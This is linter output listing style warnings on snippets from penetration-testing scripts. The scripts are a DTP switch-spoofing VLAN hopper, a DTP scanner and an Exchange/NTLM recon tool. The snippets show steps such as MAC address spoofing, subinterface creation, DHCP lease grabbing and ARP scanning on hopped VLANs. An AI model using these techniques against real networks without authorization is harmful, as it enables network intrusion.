help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:503:16
    |
501 |         return
502 |
503 |     Logger.dbg("Creating new VLAN Subinterface for {}.".format(vlan))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
504 |
505 |     out = shell("vconfig add {} {}".format(config["interface"], vlan))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:507:23
    |
505 |     out = shell("vconfig add {} {}".format(config["interface"], vlan))
506 |
507 |     if out.startswith("Added VLAN with VID == {}".format(vlan)):
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
508 |         subinterfaces.add(subif)
    |
help: Convert to f-string

N806 Variable `pidFile` in function should be lowercase
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:510:9
    |
508 |         subinterfaces.add(subif)
509 |
510 |         pidFile = tempfile.NamedTemporaryFile().name
    |         ^^^^^^^
511 |         dbFile = tempfile.NamedTemporaryFile().name
    |

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:510:19
    |
508 |         subinterfaces.add(subif)
509 |
510 |         pidFile = tempfile.NamedTemporaryFile().name
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^
511 |         dbFile = tempfile.NamedTemporaryFile().name
    |

N806 Variable `dbFile` in function should be lowercase
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:511:9
    |
510 |         pidFile = tempfile.NamedTemporaryFile().name
511 |         dbFile = tempfile.NamedTemporaryFile().name
    |         ^^^^^^
512 |
513 |         tempfiles.append(pidFile)
    |

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:511:18
    |
510 |         pidFile = tempfile.NamedTemporaryFile().name
511 |         dbFile = tempfile.NamedTemporaryFile().name
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^
512 |
513 |         tempfiles.append(pidFile)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:516:20
    |
514 |         tempfiles.append(dbFile)
515 |
516 |         Logger.dbg("So far so good, subinterface {} added.".format(subif))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
517 |
518 |         ret = False
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:520:24
    |
518 |         ret = False
519 |         for attempt in range(2):
520 |             Logger.dbg("Acquiring DHCP lease for {}".format(subif))
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
521 |
522 |             shell("dhclient -lf {} -pf {} -r {}".format(dbFile, pidFile, subif))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:522:19
    |
520 |             Logger.dbg("Acquiring DHCP lease for {}".format(subif))
521 |
522 |             shell("dhclient -lf {} -pf {} -r {}".format(dbFile, pidFile, subif))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
523 |             time.sleep(3)
    |
help: Convert to f-string

F405 `time` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:523:13
    |
522 |             shell("dhclient -lf {} -pf {} -r {}".format(dbFile, pidFile, subif))
523 |             time.sleep(3)
    |             ^^^^
524 |
525 |             if attempt > 0:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:526:23
    |
525 |             if attempt > 0:
526 |                 shell("dhclient -lf {} -pf {} -x {}".format(dbFile, pidFile, subif))
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
527 |                 time.sleep(3)
    |
help: Convert to f-string

F405 `time` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:527:17
    |
525 |             if attempt > 0:
526 |                 shell("dhclient -lf {} -pf {} -x {}".format(dbFile, pidFile, subif))
527 |                 time.sleep(3)
    |                 ^^^^
528 |
529 |             shell("dhclient -lf {} -pf {} {}".format(dbFile, pidFile, subif))
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:529:19
    |
527 |                 time.sleep(3)
528 |
529 |             shell("dhclient -lf {} -pf {} {}".format(dbFile, pidFile, subif))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
530 |
531 |             time.sleep(3)
    |
help: Convert to f-string

F405 `time` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:531:13
    |
529 |             shell("dhclient -lf {} -pf {} {}".format(dbFile, pidFile, subif))
530 |
531 |             time.sleep(3)
    |             ^^^^
532 |             ip = getIfaceIP(subif)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:535:28
    |
534 |             if ip:
535 |                 Logger.dbg("Subinterface obtained IP: {}".format(ip))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
536 |                 ret = True
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:554:21
    |
553 |                   print(
554 | /                     "[+] Hopped to VLAN {}.: {}, subnet: {}/{}".format(
555 | |                         vlan,
556 | |                         vlansLeases[vlan][0],
557 | |                         vlansLeases[vlan][1],
558 | |                         vlansLeases[vlan][2],
559 | |                     )
    | |_____________________^
560 |                   )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:569:25
    |
567 |                     launchCommand(
568 |                         subif,
569 |                         "arp-scan -x -g --vlan={} -I %IFACE %NET%CIDR".format(vlan),
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
570 |                         True,
571 |                         True,
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:575:28
    |
573 |                 break
574 |             else:
575 |                 Logger.dbg("Subinterface {} did not receive DHCPOFFER.".format(subif))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
576 |
577 |             time.sleep(5)
    |
help: Convert to f-string

F405 `time` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:577:13
    |
575 |                 Logger.dbg("Subinterface {} did not receive DHCPOFFER.".format(subif))
576 |
577 |             time.sleep(5)
    |             ^^^^
578 |
579 |         if not ret:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:580:25
    |
579 |         if not ret:
580 |             Logger.fail("Could not acquire DHCP lease for: {}. Skipping.".format(subif))
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
581 |
582 |     else:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:583:21
    |
582 |     else:
583 |         Logger.fail('Failed.: "{}"'.format(out))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Convert to f-string

F405 `time` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:588:9
    |
586 | def addVlansFromCdp(vlans):
587 |     while not attackEngaged:
588 |         time.sleep(3)
    |         ^^^^
589 |         if stopThreads:
590 |             return
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:593:21
    |
592 |     for vlan in vlans:
593 |         Logger.info("Trying to hop to VLAN discovered in CDP packet: {}".format(vlan))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
594 |         t = threading.Thread(target=addVlanIface, args=(vlan,))
595 |         t.daemon = True
    |
help: Convert to f-string

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:604:12
    |
602 |     global vlansDiscovered
603 |
604 |     if not Dot3 in pkt or not pkt.dst == "01:00:0c:cc:cc:cc":
    |            ^^^^^^^^^^^
605 |         return
    |
help: Convert to `not in`

F405 `Dot3` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:604:12
    |
602 |     global vlansDiscovered
603 |
604 |     if not Dot3 in pkt or not pkt.dst == "01:00:0c:cc:cc:cc":
    |            ^^^^
605 |         return
    |

SIM201 Use `pkt.dst != "01:00:0c:cc:cc:cc"` instead of `not pkt.dst == "01:00:0c:cc:cc:cc"`
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:604:27
    |
602 |     global vlansDiscovered
603 |
604 |     if not Dot3 in pkt or not pkt.dst == "01:00:0c:cc:cc:cc":
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
605 |         return
    |
help: Replace with `!=` operator

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:627:12
    |
625 |     out = ""
626 |     for tlv in pkt.msg:
627 |         if tlv.type in tlvs.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^
628 |             fmt = ""
629 |             key = "    {}:".format(tlvs[tlv.type])
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:629:19
    |
627 |         if tlv.type in tlvs.keys():
628 |             fmt = ""
629 |             key = "    {}:".format(tlvs[tlv.type])
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
630 |             key = key.ljust(25)
631 |             if hasattr(tlv, "val"):
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:658:28
    |
656 |                 for i in range(tlv.naddr):
657 |                     addr = tlv.addr[i].addr
658 |                     fmt += "{}, ".format(addr)
    |                            ^^^^^^^^^^^^^^^^^^^
659 |
660 |             wrapper = textwrap.TextWrapper(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:663:20
    |
661 |                 initial_indent=key, width=80, subsequent_indent=" " * len(key)
662 |             )
663 |             out += "{}\n".format(wrapper.fill(fmt))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
664 |             Logger.dbg(
665 |                 "Discovered new VLANs in CDP announcement: {} = {}".format(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:665:17
    |
663 |               out += "{}\n".format(wrapper.fill(fmt))
664 |               Logger.dbg(
665 | /                 "Discovered new VLANs in CDP announcement: {} = {}".format(
666 | |                     tlvs[tlv.type], out.strip()
667 | |                 )
    | |_________________^
668 |               )
    |
help: Convert to f-string

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:672:12
    |
670 |     out = re.sub(r"(?:\n)+", "\n", out)
671 |
672 |     if not out in cdpsCollected:
    |            ^^^^^^^^^^^^^^^^^^^^
673 |         cdpsCollected.add(out)
674 |         print("\n[+] Discovered new CDP aware device:\n{}".format(out))
    |
help: Convert to `not in`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:674:15
    |
672 |     if not out in cdpsCollected:
673 |         cdpsCollected.add(out)
674 |         print("\n[+] Discovered new CDP aware device:\n{}".format(out))
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
675 |
676 |         if not config["analyse"]:
    |
help: Convert to f-string

F405 `Dot3` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:687:8
    |
685 |     Logger.dbg("RECV: " + pkt.summary())
686 |
687 |     if Dot3 in pkt and pkt.dst == "01:00:0c:cc:cc:cc":
    |        ^^^^
688 |         processCdp(pkt)
    |

N806 Variable `warnOnce` in function should be lowercase
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:693:5
    |
691 | def sniffThread():
692 |     global vlansDiscovered
693 |     warnOnce = False
    |     ^^^^^^^^
694 |
695 |     Logger.info(
    |

F405 `sniff` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:704:20
    |
702 |         dtps = []
703 |         try:
704 |             dtps = sniff(
    |                    ^^^^^
705 |                 count=config["count"],
706 |                 filter="ether[20:2] == 0x2004 or ether[20:2] == 0x2000",
    |

F405 `DTP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:709:50
    |
707 |                 timeout=config["timeout"],
708 |                 prn=packetCallback,
709 |                 stop_filter=lambda x: x.haslayer(DTP) or stopThreads,
    |                                                  ^^^
710 |                 iface=config["interface"],
711 |             )
    |

N806 Variable `warnOnce` in function should be lowercase
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:724:13
    |
722 |             Logger.info("\tSWITCH(config-if)# switchport nonnegotiate\t/ or / ")
723 |             Logger.info("\tSWITCH(config-if)# switchport mode access\n")
724 |             warnOnce = True
    |             ^^^^^^^^
725 |
726 |         if len(dtps) > 0 or config["force"]:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:728:28
    |
726 |         if len(dtps) > 0 or config["force"]:
727 |             if len(dtps) > 0:
728 |                 Logger.dbg("Got {} DTP frames.\n".format(len(dtps)))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
729 |             else:
730 |                 Logger.info("Forced mode: Beginning attack blindly.")
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:742:22
    |
740 |     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
741 |     info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack("256s", ifname[:15]))
742 |     return ":".join(["%02x" % ord(char) for char in info[18:24]])
    |                      ^^^^^^^^^^^^^^^^^^
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:751:16
    |
749 |         + " | grep 'inet ' | awk '{print $2}' | head -1 | cut -d/ -f1"
750 |     )
751 |     Logger.dbg("Interface: {} has IP: {}".format(iface, out))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
752 |     return out
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:758:9
    |
756 |       old = getHwAddr(iface)
757 |       print(
758 | /         "[>] Changing MAC address of interface {}, from: {} to: {}".format(
759 | |             iface, old, mac
760 | |         )
    | |_________^
761 |       )
762 |       shell("ifconfig {} down".format(iface))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:762:11
    |
760 |         )
761 |     )
762 |     shell("ifconfig {} down".format(iface))
    |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
763 |     shell("ifconfig {} hw ether {}".format(iface, mac))
764 |     shell("ifconfig {} up".format(iface))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:763:11
    |
761 |     )
762 |     shell("ifconfig {} down".format(iface))
763 |     shell("ifconfig {} hw ether {}".format(iface, mac))
    |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
764 |     shell("ifconfig {} up".format(iface))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:764:11
    |
762 |     shell("ifconfig {} down".format(iface))
763 |     shell("ifconfig {} hw ether {}".format(iface, mac))
764 |     shell("ifconfig {} up".format(iface))
    |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
765 |
766 |     ret = old != getHwAddr(iface)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:797:16
    |
795 | def shell(cmd):
796 |     out = commands.getstatusoutput(cmd)[1]
797 |     Logger.dbg('shell("{}") returned:\n"{}"'.format(cmd, out))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
798 |     return out
    |
help: Convert to f-string

B007 Loop control variable `k` not used within loop body
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:808:9
    |
806 |     }
807 |
808 |     for k, v in commands.items():
    |         ^
809 |         out = shell(v)
810 |         if len(out) > 0:
    |
help: Rename unused `k` to `_k`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:811:25
    |
809 |         out = shell(v)
810 |         if len(out) > 0:
811 |             Logger.info("Default interface lookup command returned:\n{}".format(out))
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
812 |             config["interface"] = out
813 |             return out
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:825:24
    |
823 |     if vconfigAvailable:
824 |         for subif in subinterfaces:
825 |             Logger.dbg("Removing subinterface: {}".format(subif))
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
826 |
827 |             launchCommands(subif, config["exitcommands"])
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:828:19
    |
827 |             launchCommands(subif, config["exitcommands"])
828 |             shell("vconfig rem {}".format(subif))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
829 |
830 |     Logger.dbg("Removing temporary files...")
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:837:9
    |
835 |   def parseOptions(argv):
836 |       print(
837 | /         """
838 | |         :: VLAN Hopping via DTP Trunk negotiation 
839 | |         Performs VLAN Hopping via negotiated DTP Trunk / Switch Spoofing technique
840 | |         Mariusz Banach / mgeeky '18-19, <mb@binary-offensive.com>
841 | |         v{}
842 | | """.format(
843 | |             VERSION
844 | |         )
    | |_________^
845 |       )
    |
help: Convert to f-string

W291 Trailing whitespace
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:838:50
    |
836 |     print(
837 |         """
838 |         :: VLAN Hopping via DTP Trunk negotiation 
    |                                                  ^
839 |         Performs VLAN Hopping via negotiated DTP Trunk / Switch Spoofing technique
840 |         Mariusz Banach / mgeeky '18-19, <mb@binary-offensive.com>
    |
help: Remove trailing whitespace

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:924:13
    |
922 |       if len(vlansHopped):
923 |           print(
924 | /             "Successfully hopped (and got DHCP lease) to following VLANs ({}):".format(
925 | |                 len(vlansHopped)
926 | |             )
    | |_____________^
927 |           )
928 |           for vlan, net in vlansLeases.items():
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:929:19
    |
927 |         )
928 |         for vlan, net in vlansLeases.items():
929 |             print("- VLAN {}: {}, subnet: {}/{}".format(vlan, net[0], net[1], net[2]))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
930 |     else:
931 |         print("Did not hop into any VLAN.")
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:935:15
    |
933 |     print("\n[VLANS DISCOVERED]")
934 |     if len(vlansDiscovered):
935 |         print("Discovered following VLANs ({}):".format(len(vlansDiscovered)))
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
936 |         for vlan in vlansDiscovered:
937 |             print("- VLAN {}".format(vlan))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:937:19
    |
935 |         print("Discovered following VLANs ({}):".format(len(vlansDiscovered)))
936 |         for vlan in vlansDiscovered:
937 |             print("- VLAN {}".format(vlan))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^
938 |     else:
939 |         print("No VLANs discovered.")
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:943:15
    |
941 |     print("\n[CDP DEVICES]")
942 |     if len(cdpsCollected):
943 |         print("Discovered following CDP aware devices ({}):".format(len(cdpsCollected)))
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
944 |         for dev in cdpsCollected:
945 |             print(dev + "\n")
    |
help: Convert to f-string

F405 `load_contrib` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:964:5
    |
962 |         return False
963 |
964 |     load_contrib("dtp")
    |     ^^^^^^^^^^^^
965 |     load_contrib("cdp")
    |

F405 `load_contrib` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:965:5
    |
964 |     load_contrib("dtp")
965 |     load_contrib("cdp")
    |     ^^^^^^^^^^^^
966 |
967 |     if not assure8021qCapabilities():
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:981:5
    |
979 |               return False
980 |
981 | /     if not opts.interface:
982 | |         if not selectDefaultInterface():
    | |________________________________________^
983 |               Logger.err("Could not find suitable interface. Please specify it.")
984 |               return False
    |
help: Combine `if` statements using `and`

N806 Variable `oldMac` in function should be lowercase
    --> security\penetration-testing-tools\networks\VLANHopperDTP.py:1007:5
     |
1005 |         Logger.fail("Could not acquire interface's IP address! Proceeding...")
1006 |
1007 |     oldMac = config["macaddr"]
     |     ^^^^^^
1008 |     if opts.mac:
1009 |         oldMac = changeMacAddress(config["interface"], opts.mac)
     |

N806 Variable `oldMac` in function should be lowercase
    --> security\penetration-testing-tools\networks\VLANHopperDTP.py:1009:9
     |
1007 |     oldMac = config["macaddr"]
1008 |     if opts.mac:
1009 |         oldMac = changeMacAddress(config["interface"], opts.mac)
     |         ^^^^^^
1010 |         if oldMac:
1011 |             config["macaddr"] = opts.mac
     |

F405 `time` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\networks\VLANHopperDTP.py:1032:5
     |
1031 |     stopThreads = True
1032 |     time.sleep(3)
     |     ^^^^
1033 |
1034 |     cleanup()
     |

F403 `from scapy.all import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\networks\dtpscan.py:14:1
   |
12 | import sys
13 |
14 | from scapy.all import *
   | ^^^^^^^^^^^^^^^^^^^^^^^
15 |
16 | config = {"count": 10, "timeout": 90}
   |

N816 Variable `ciscoConfigMaps` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\dtpscan.py:18:1
   |
16 | config = {"count": 10, "timeout": 90}
17 |
18 | ciscoConfigMaps = {
   | ^^^^^^^^^^^^^^^
19 |     2: """
20 |         ACCESS/OFF/ACCESS
   |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\networks\dtpscan.py:51:8
   |
50 | def showConfig(stat):
51 |     if stat in ciscoConfigMaps.keys():
   |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
52 |         print(ciscoConfigMaps[stat])
   |
help: Remove `.keys()`

F405 `load_contrib` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\dtpscan.py:120:5
    |
118 |         return False
119 |
120 |     load_contrib("dtp")
    |     ^^^^^^^^^^^^
121 |
122 |     print(
    |

F405 `sniff` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\dtpscan.py:128:12
    |
126 |     )
127 |
128 |     dtps = sniff(
    |            ^^^^^
129 |         count=config["count"],
130 |         filter="ether[20:2] == 0x2004",
    |

F405 `DTP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\dtpscan.py:133:42
    |
131 |         timeout=config["timeout"],
132 |         prn=packetCallback,
133 |         stop_filter=lambda x: x.haslayer(DTP),
    |                                          ^^^
134 |     )
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\dtpscan.py:145:11
    |
143 |         return False
144 |
145 |     print("[*] Got {} DTP frames.\n".format(len(dtps)))
    |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
146 |
147 |     success = False
    |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\networks\dtpscan.py:149:9
    |
147 |       success = False
148 |       for dtp in dtps:
149 | /         if dtp.haslayer(DTP):
150 | |             if inspectPacket(dtp):
    | |__________________________________^
151 |                   success = True
152 |                   break
    |
help: Combine `if` statements using `and`

F405 `DTP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\dtpscan.py:149:25
    |
147 |     success = False
148 |     for dtp in dtps:
149 |         if dtp.haslayer(DTP):
    |                         ^^^
150 |             if inspectPacket(dtp):
151 |                 success = True
    |

F841 Local variable `s` is assigned to but never used
   --> security\penetration-testing-tools\networks\exchangeRecon.py:103:5
    |
102 | def hexdump(data):
103 |     s = ""
    |     ^
104 |     n = 0
105 |     lines = []
    |
help: Remove assignment to unused variable `s`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\networks\exchangeRecon.py:115:17
    |
113 |     for i in range(0, len(data), 16):
114 |         line = ""
115 |         line += "%04x | " % (i)
    |                 ^^^^^^^^^^^^^^^
116 |         n += 16
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\networks\exchangeRecon.py:132:21
    |
130 |                 break
131 |             c = data[j] if not (data[j] < 0x20 or data[j] > 0x7E) else "."
132 |             line += "%c" % c
    |                     ^^^^
133 |
134 |         line = line.ljust(74, " ") + " |"
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\networks\exchangeRecon.py:204:17
    |
203 |     def flags_str(self, flags):
204 |         return ["%s" % s for s in self.flags_lst(flags)]
    |                 ^^^^^^^^
205 |
206 |     def clean_str(self, st):
    |
help: Replace with format specifiers

UP004 [*] Class `StrStruct` inherits from `object`
   --> security\penetration-testing-tools\networks\exchangeRecon.py:209:21
    |
207 |         return "".join((s if s in NtlmParser.VALID_CHRS else "?") for s in st)
208 |
209 |     class StrStruct(object):
    |                     ^^^^^^
210 |         def __init__(self, pos_tup, raw):
211 |             length, alloc, offset = pos_tup
    |
help: Remove `object` inheritance

E722 Do not use bare `except`
   --> security\penetration-testing-tools\networks\exchangeRecon.py:221:17
    |
219 |                 try:
220 |                     self.string = self.raw.decode("utf-16", "ignore")
221 |                 except:
    |                 ^^^^^^
222 |                     self.string = "".join(
223 |                         filter(lambda x: str(x) != str("\0"), self.raw)
    |

UP018 [*] Unnecessary `str` call (rewrite as a literal)
   --> security\penetration-testing-tools\networks\exchangeRecon.py:223:52
    |
221 |                 except:
222 |                     self.string = "".join(
223 |                         filter(lambda x: str(x) != str("\0"), self.raw)
    |                                                    ^^^^^^^^^
224 |                     )
225 |                 self.utf16 = True
    |
help: Replace with string literal

N806 Variable `EPOCH_AS_FILETIME` in function should be lowercase
   --> security\penetration-testing-tools\networks\exchangeRecon.py:285:9
    |
283 |         from datetime import datetime
284 |
285 |         EPOCH_AS_FILETIME = 116444736000000000  # January 1, 1970 as MS file time
    |         ^^^^^^^^^^^^^^^^^
286 |         utc = datetime.utcfromtimestamp((ft - EPOCH_AS_FILETIME) / 10000000)
287 |         return utc.strftime("%y-%m-%d %a %H:%M:%S UTC")
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\networks\exchangeRecon.py:315:20
    |
313 |                 rec_sz = rec_hdr[1]
314 |                 subst = raw[pos + 4 : pos + 4 + rec_sz]
315 |                 if rec_type_type == int:
    |                    ^^^^^^^^^^^^^^^^^^^^
316 |                     if "Timestamp" in rec_type:
317 |                         self.output["Target"][rec_type] = (
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\networks\exchangeRecon.py:324:22
    |
322 |                     else:
323 |                         self.output["Target"][rec_type] = struct.unpack("<Q", subst)[0]
324 |                 elif rec_type_type == str:
    |                      ^^^^^^^^^^^^^^^^^^^^
325 |                     try:
326 |                         self.output["Target"][rec_type] = subst.decode("utf-16")
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\networks\exchangeRecon.py:327:21
    |
325 |                     try:
326 |                         self.output["Target"][rec_type] = subst.decode("utf-16")
327 |                     except:
    |                     ^^^^^^
328 |                         self.output["Target"][rec_type] = subst
329 |                 pos += 4 + rec_sz
    |

N815 Variable `leakedInternalIp` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\exchangeRecon.py:367:5
    |
365 |     }
366 |
367 |     leakedInternalIp = "Leaked Internal IP address"
